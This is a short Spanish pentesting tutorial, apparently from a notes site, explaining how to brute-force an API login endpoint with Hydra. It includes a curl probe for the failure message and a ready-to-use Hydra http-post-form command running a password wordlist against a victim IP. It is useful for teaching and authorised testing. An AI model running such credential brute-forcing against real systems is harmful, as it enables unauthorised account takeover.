# ❓ API

## Fuerza bruta

Imagina que encuentras que un aplicativo web usar una API para hacer peticiones con las credenciales y así loguearse o no, pues en este caso, podemos hacer fuerza bruta con Hydra

### Hydra

{% hint style="info" %}
Los parámetros -l y -p pueden ser cambiados en función de nuestras necesidades, en el caso de que tengamos un diccionario (ya sea de usuario o contraseñas) ponemos el parámetro en mayúscula y le indicamos la ruta del diccionario, en el caso de que queramos probar con una contraseña o usuario concreto lo usaremos en minúscula.
{% endhint %}

En el siguiente comando, podemos ver que al final hay un string entre comillas, en este le deberemos de indicar separado por dos puntos en el siguiente orden:

1. El endpoint de la API (el endpoint al que manda la petición con las credenciales para verificarlas)
2. El contenido de la petición, imagina que al interceptarla aparece así :point\_down:deberás modificarla para que quede de esta manera :point\_down::point\_down:

```bash
{
    "username":"usuario",
    "password":"contraseña"
}
```

```ruby
username=^USER^&password=^PASS^
```

3. Por último deberemos de indicar el mensaje de error que nos dará la API en el caso de que las credenciales no sean validas, para saberlo, podemos hacer una petición con curl (p. ej: `curl -X POST http://IP/ENDPOINT -H "Content-Type: application/json" -d "{"username":"usuario","password":"contraseña"}"` .Es importante modificar el content-type al que necesite la API (puedes consultarlo haciendo una petición)

```perl
hydra -l usuario -P /ruta/diccionario.txt ipvictima http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```
